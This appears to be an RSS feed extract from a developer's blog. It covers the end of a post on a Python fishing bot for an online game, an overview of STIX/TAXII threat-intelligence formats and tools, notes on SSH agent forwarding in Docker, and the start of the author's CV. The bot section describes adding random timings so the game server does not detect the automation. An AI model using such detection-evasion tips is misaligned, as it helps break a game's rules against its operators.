&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CONFIDENCE &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0.7&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Variable&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>FISHING_BUTTON&lt;/td>
&lt;td>The button that you use for fishing, in my case it was &lt;code>b&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>TUNE_BAIT_MOUSE_UNDER_PX&lt;/td>
&lt;td>The offset pixels where the mouse is going to be whenever there is a bait, see the &lt;a href="#how-it-works">How it works?&lt;/a> section&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>EDGE_RESET&lt;/td>
&lt;td>Those are the &lt;code>x, y&lt;/code> coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at &lt;code>10, 10&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ACTIVE_AFTER&lt;/td>
&lt;td>The bot simply waits 2 secs before it starts&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>CONFIDENCE&lt;/td>
&lt;td>The confidence of the template matching&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="how-it-works" >How it works?
&lt;span>
&lt;a href="#how-it-works">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>The method is extremely simple, it utilizes two things. The first one is the &lt;a href="https://docs.opencv.org/4.x/d4/dc6/tutorial_py_template_matching.html">Template Matching&lt;/a>, this is what &lt;code>pyautogui.locateOnScreen&lt;/code> uses under the hood and the second one is the &lt;a href="https://github.com/mhammond/pywin32/blob/c08c3d9e4a503b195c312b0fbd51454bd2ee665a/win32/src/win32gui.i#L2486">PyGetCursorInfo&lt;/a> function which is exposed by the &lt;code>win32gui&lt;/code> lib.&lt;/p>
&lt;p>The solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the &lt;code>GetCursorInfo&lt;/code> to catch the change of the cursor and if it becomes a different &lt;code>tuple&lt;/code> from the default one which we set when there is nothing active on our cursor. Then we execute the click.&lt;/p>
&lt;p>Now about the fine-tuning, look at this example&lt;/p>
&lt;p>&lt;img src="https://sy1.sh/fishing-bot/diagram_bobber.png" alt="Abstract">&lt;/p>
&lt;p>The &lt;code>TUNE_BAIT_MOUSE_UNDER_PX&lt;/code> variable which doesn&amp;rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.&lt;/p>
&lt;h2 id="edge-cases" >Edge cases
&lt;span>
&lt;a href="#edge-cases">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>There is a rare edge case when the default tuple for the cursor doesn&amp;rsquo;t change which happens if the script isn&amp;rsquo;t tune right, I&amp;rsquo;ve solved this by resetting the cursor at &lt;code>x=10, y=10&lt;/code> position of the screen and then bringing it back. In a case when the cursor&amp;rsquo;s icon doesn&amp;rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.&lt;/p>
&lt;h2 id="additional-features" >Additional features
&lt;span>
&lt;a href="#additional-features">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>I&amp;rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.&lt;/p></description></item><item><title>STIX/TAXII - Complete Knowledge</title><link>https://sy1.sh/posts/stix-taxii-complete-knowledge/</link><pubDate>Sun, 10 Apr 2022 21:42:39 +0300</pubDate><guid>https://sy1.sh/posts/stix-taxii-complete-knowledge/</guid><description>&lt;h2 id="introduction" >Introduction
&lt;span>
&lt;a href="#introduction">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;h3 id="stix" >STIX
&lt;span>
&lt;a href="#stix">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;p>What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).&lt;/p>
&lt;p>Here is a very simple representation of STIX Objects in a graph.
&lt;img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bsuw7lnfzefu81oft2fq.png" alt="STIX Example">
&lt;a href="https://oasis-open.github.io/cti-documentation/examples/sighting-of-an-indicator">Explanation of the example&lt;/a>&lt;/p>
&lt;p>The data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX. All the list of the examples you can find in their &lt;a href="https://oasis-open.github.io/cti-documentation/stix/examples">official example page&lt;/a>.&lt;/p>
&lt;h3 id="taxii" >TAXII
&lt;span>
&lt;a href="#taxii">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;p>The STIX data has to be relayed in some way, that&amp;rsquo;s why we have the TAXII Server. It is a simple web server specifically created for storing and sharing that kind of data.&lt;/p>
&lt;h4 id="taxii-1x-structure" >TAXII 1.x Structure
&lt;span>
&lt;a href="#taxii-1x-structure">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h4>&lt;p>The TAXII 1.2 Server has the following structure:&lt;/p>
&lt;ul>
&lt;li>Discovery Service - Within a POST request to their discovery URL (which should be pointed by the Server maintainers).&lt;/li>
&lt;li>Collection Management URL - The service that has the collections with STIX objects.&lt;/li>
&lt;li>Channels - Push/Subscribe pattern.&lt;/li>
&lt;/ul>
&lt;p>The full list of features for TAXII1 can be found in their official documentation:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html">https://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf">https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.oasis-open.org/committees/download.php/57324/OASIS">https://www.oasis-open.org/committees/download.php/57324/OASIS&lt;/a>&lt;/li>
&lt;/ul>
&lt;h4 id="taxii-2x-structure" >TAXII 2.x Structure
&lt;span>
&lt;a href="#taxii-2x-structure">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h4>&lt;p>For the newer versions of the TAXII Server we have the following structure:&lt;/p>
&lt;p>&lt;img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2my74ivbmrhswj1nd83b.png" alt="Image description">&lt;/p>
&lt;ul>
&lt;li>&lt;code>/discovery&lt;/code> - Discovers the paths to the different services provided by the Server.&lt;/li>
&lt;li>&lt;code>api_roots&lt;/code> - Provides the API URLs for the different types of Collection Management.
&lt;ul>
&lt;li>&lt;code>collections&lt;/code> - Provides the available collections for the given &lt;code>api_root&lt;/code>.
&lt;ul>
&lt;li>&lt;code>collection/objects&lt;/code> - Provides a list of STIX Objects in a given collection&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>You can see that this is very similar to the TAXII 1.x servers, there isn&amp;rsquo;t much of a difference in the structure besides that the &lt;code>collection_management_url&lt;/code> is &lt;code>api_root&lt;/code> in TAXII 2.x.&lt;/p>
&lt;p>The full list of features for TAXII2 can be found in their &lt;a href="https://docs.oasis-open.org/cti/taxii/v2.1/csprd01/taxii-v2.1-csprd01.html">official documentation&lt;/a>.&lt;/p>
&lt;h4 id="taxii-servers-and-threat-intelligence-providers" >TAXII Servers and Threat Intelligence Providers
&lt;span>
&lt;a href="#taxii-servers-and-threat-intelligence-providers">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h4>&lt;p>The information about this is very scarce so I&amp;rsquo;ve gathered a quick list of the known providers for STIX data.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Resource&lt;/th>
&lt;th>URL&lt;/th>
&lt;th>Description&lt;/th>
&lt;th>Data Type&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>AlienVault OTX&lt;/td>
&lt;td>&lt;a href="https://otx.alienvault.com/api">https://otx.alienvault.com/api&lt;/a>&lt;/td>
&lt;td>Requires an account, provides data in various ways including a TAXII Server.&lt;/td>
&lt;td>STIX 1.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Threat Connect&lt;/td>
&lt;td>&lt;a href="https://threatconnect.com/stix-taxii/">https://threatconnect.com/stix-taxii/&lt;/a>&lt;/td>
&lt;td>Requires an account, Paid service, (consumes and provides) threat intel.&lt;/td>
&lt;td>STIX 1.x/2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>EcleticIQ&lt;/td>
&lt;td>&lt;a href="https://www.taxiistand.com/">https://www.taxiistand.com/&lt;/a>&lt;/td>
&lt;td>Test TAXII (v1x) server. (quite unstable and inconsistent)&lt;/td>
&lt;td>STIX 1.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Limo - Anomali&lt;/td>
&lt;td>&lt;a href="https://www.anomali.com/resources/limo">https://www.anomali.com/resources/limo&lt;/a>&lt;/td>
&lt;td>Test TAXII (v1x/v2x) server. Somewhat unstable but mostly fine during tests.&lt;/td>
&lt;td>STIX 1.x/2.x&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="tools-for-stixtaxii" >Tools for STIX/TAXII
&lt;span>
&lt;a href="#tools-for-stixtaxii">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>The main tool for creating/parsing or generating STIX data is going to be Python, since that all of the tools created are written in Python. Of course there are other alternatives but currently that&amp;rsquo;s the most common one.&lt;/p>
&lt;p>Other tools that might come in handy.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Tool&lt;/th>
&lt;th>Description&lt;/th>
&lt;th>Version&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;a href="https://github.com/opencybersecurityalliance/stix-shifter">stix-shifter&lt;/a>&lt;/td>
&lt;td>Translates STIX to various other Threat Intelligence formats such as Carbon Black Cloud Query and others&lt;/td>
&lt;td>STIX 1.x/2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/oasis-open/cti-python-stix2">stix2&lt;/a>&lt;/td>
&lt;td>The main python package to parse and use/create STIX2 data.&lt;/td>
&lt;td>STIX 2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/oasis-open/cti-stix-validator">stix2-validator&lt;/a>&lt;/td>
&lt;td>Provides a validation for the STIX2 data, can be used to validate your data from your sources.&lt;/td>
&lt;td>STIX 2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/oasis-open/cti-stix-slider">stix2-slider&lt;/a>&lt;/td>
&lt;td>Transforms STIX2 content to STIX1.2&lt;/td>
&lt;td>STIX 2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/oasis-open/cti-stix-elevator">stix2-elevator&lt;/a>&lt;/td>
&lt;td>Transforms STIX1 data to STIX2.x&lt;/td>
&lt;td>STIX 1.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/STIXProject/python-stix">stix&lt;/a>&lt;/td>
&lt;td>The main python package for STIX1 data.&lt;/td>
&lt;td>STIX 1.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/STIXProject/stix-validator">stix-validator&lt;/a>&lt;/td>
&lt;td>Validating STIX1 data.&lt;/td>
&lt;td>STIX 1.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/oasis-open/cti-pattern-validator">stix2-patterns&lt;/a>&lt;/td>
&lt;td>Validator and Pattern Parser for STIX 2.x Patterns&lt;/td>
&lt;td>STIX 2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/oasis-open/cti-taxii-client/">taxii2-client&lt;/a>&lt;/td>
&lt;td>Python Client for TAXII 2 Servers&lt;/td>
&lt;td>TAXII 2.x&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;a href="https://github.com/EclecticIQ/cabby/">cabby&lt;/a>&lt;/td>
&lt;td>Python Client for TAXII 1 Servers&lt;/td>
&lt;td>TAXII 1.x&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="snippets-and-gists" >Snippets and Gists
&lt;span>
&lt;a href="#snippets-and-gists">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>&lt;a href="https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d">https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d&lt;/a> (Creating a TAXII2 Client for LimoAnomali)&lt;/li>
&lt;li>&lt;a href="https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858">https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858&lt;/a> (Creating a TAXII1 Client for OTXAlienVault)&lt;/li>
&lt;/ul></description></item><item><title>Installing Private Packages in Docker Image - Notes</title><link>https://sy1.sh/posts/installing-private-packages-in-docker-image-notes/</link><pubDate>Thu, 27 May 2021 21:44:47 +0300</pubDate><guid>https://sy1.sh/posts/installing-private-packages-in-docker-image-notes/</guid><description>&lt;p>Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.&lt;/p>
&lt;h2 id="using-ssh-forwarding" >Using SSH Forwarding
&lt;span>
&lt;a href="#using-ssh-forwarding">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Exporting the &lt;code>$SSH_AUTH_SOCK&lt;/code> environment variable in the image.&lt;/p>
&lt;pre tabindex="0">&lt;code>$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash
&lt;/code>&lt;/pre>&lt;p>Or in the &lt;code>environment&lt;/code> section of a compose file.&lt;/p>
&lt;pre tabindex="0">&lt;code>environment:
SSH_AUTH_SOCK: $SSH_AUTH_SOCK
&lt;/code>&lt;/pre>&lt;h3 id="eventual-issues-with-that" >Eventual Issues with that
&lt;span>
&lt;a href="#eventual-issues-with-that">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>Installing ssh in the container&lt;/li>
&lt;li>Adding entries to &lt;code>/etc/ssh/ssh_known_hosts&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="caveats" >Caveats
&lt;span>
&lt;a href="#caveats">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>Traces of ssh keys inside the image&lt;/li>
&lt;/ul>
&lt;h2 id="references" >References
&lt;span>
&lt;a href="#references">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ul>
&lt;li>&lt;a href="https://gist.github.com/d11wtq/8699521">https://gist.github.com/d11wtq/8699521&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://vsupalov.com/build-docker-image-clone-private-repo-ssh-key/">https://vsupalov.com/build-docker-image-clone-private-repo-ssh-key/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://medium.com/@bmihelac/examples-for-building-docker-images-with-private-python-packages-6314440e257c">https://medium.com/@bmihelac/examples-for-building-docker-images-with-private-python-packages-6314440e257c&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>CV</title><link>https://sy1.sh/cv/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sy1.sh/cv/</guid><description>&lt;p>&lt;a href="https://sy1.sh/cv/cv.pdf">Download PDF&lt;/a>&lt;/p>
&lt;p>My name is Dimitar Ganev and I am a software engineer interested in software architecture and building systems/tools from scratch. Areas of expertise/interest include Python, Pipelines, Debugging and Profiling. I am located in Bulgaria and I have worked as a remote engineer since 2019.&lt;/p>
&lt;h1 id="speaker" >&lt;strong>Speaker&lt;/strong>
&lt;span>
&lt;a href="#speaker">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
&lt;li>@VMware Explore 2022 (1 Sep 2022 in San Francisco, California) - Converting Third-Party Threat Intelligence into Carbon Black Cloud - &lt;a href="https://www.youtube.com/watch?v=e74if-9KSZ4&amp;amp;list=PLnopqt07fPn1kBTIHiQ8ZeYaZQ-HQrXVg&amp;amp;index=13">Prerecorded version&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="software-experience" >&lt;strong>Software Experience&lt;/strong>
&lt;span>
&lt;a href="#software-experience">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.vmware.com/">&lt;strong>VMware&lt;/strong>&lt;/a> (Software Engineer) &amp;gt; Sep 2021 - Present&lt;/p>
&lt;p>Projects:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Threat Intelligence Connector for Carbon Black Cloud&lt;/strong> (&lt;a href="https://github.com/carbonblack/carbon-black-cloud-threat-intelligence-connector">https://github.com/carbonblack/carbon-black-cloud-threat-intelligence-connector&lt;/a>) - Main Developer and Maintainer&lt;/li>
&lt;li>&lt;strong>VMware Carbon Black Cloud Python SDK&lt;/strong> (&lt;a href="https://github.com/carbonblack/carbon-black-cloud-sdk-python">https://github.com/carbonblack/carbon-black-cloud-sdk-python&lt;/a>) - Developer and Maintainer&lt;/li>
&lt;/ul>
&lt;p>And other closed-source projects.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.aiidatapro.com/">&lt;strong>ADataPro&lt;/strong>&lt;/a> (Software Engineer) &amp;gt; 2019-06 - 2021-09&lt;/p>
&lt;p>Managing the infrastructure, leading an architectural decisions, mentoring.&lt;/p>
&lt;p>Projects:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Media Listening Platform&lt;/strong> - Platform for media listening and tracking&lt;/li>
&lt;li>&lt;strong>AI Media Intelligence Solution for TV/Radio&lt;/strong> - Cutting the cost for the company by 20x by implementing my idea for a Media Intelligence Listening Service - Sole Developer and Maintainer&lt;/li>
&lt;li>&lt;strong>Crawling Solutions for various Websites&lt;/strong> - Created crawling solutions for numerous websites. - Developer&lt;/li>
&lt;/ul>
&lt;p>And other numerous ETL scripts and SDKs.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://nex-gen.eu/">&lt;strong>NexGen LTD&lt;/strong>&lt;/a> (Software Engineer) &amp;gt; 2018-10 - 2019-04&lt;/p>
&lt;p>Projects:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>IntraPricing Solution&lt;/strong> (&lt;a href="https://intrapricing.com/">https://intrapricing.com/&lt;/a>) - Maintaining the system&lt;/li>
&lt;li>&lt;strong>Harzreisen&lt;/strong> (&lt;a href="https://harzreisen.de/">https://harzreisen.de/&lt;/a>) - Created the most of the frontend and the backend for the platform also including the admin panel.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.j-soft.net/">&lt;strong>JSoft&lt;/strong>&lt;/a> (Software Engineer) &amp;gt; 2016-11 - 2017-03&lt;/p>
&lt;p>Projects:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Property Management System&lt;/strong> - Developed a Property Management System with a small team of developers&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h1 id="audio-producing-experience" >&lt;strong>Audio Producing Experience&lt;/strong>
&lt;span>
&lt;a href="#audio-producing-experience">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
&lt;li>&lt;a href="https://audiojungle.net/user/fujimsc/portfolio">&lt;strong>Full Length Productions / Sound Design - AudioJungle&lt;/strong>&lt;/a> (Audio Producer / Sound Designer) &amp;gt; 2017 - Present&lt;/li>
&lt;li>&lt;a href="https://www.shutterstock.com/music/artist/Fuji">&lt;strong>Full Length Productions / Sound Design - Shutterstock Music&lt;/strong>&lt;/a> (Audio Producer / Sound Designer) &amp;gt; 2016 - Present&lt;/li>
&lt;/ul>
&lt;h1 id="education" >&lt;strong>Education&lt;/strong>
&lt;span>
&lt;a href="#education">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
